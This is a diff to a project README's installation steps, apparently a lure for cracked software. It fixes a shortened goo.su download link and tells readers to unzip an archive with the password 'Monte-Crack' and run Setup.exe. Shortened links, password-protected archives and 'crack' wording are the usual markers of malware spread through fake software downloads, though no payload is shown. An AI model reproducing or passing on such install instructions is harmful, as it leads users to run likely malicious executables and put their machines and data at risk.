@@ -18,7 +18,7 @@
 
 ## Installation 🛠️
 
-1. **Download:** [Grab the latest Release of the enhanced version.](goo.su/9ijgqia) 📥
+1. **Download:** [Grab the latest Release of the enhanced version.](https://goo.su/9ijgqia) 📥
 2. **Extract:** Unzip the files to your desktop using the password **Monte-Crack**. 🖥️
 3. **Install:** Run **Setup.exe** and wait for it to install. 🖱️
 4. **Enjoy!** Start using. 🎉
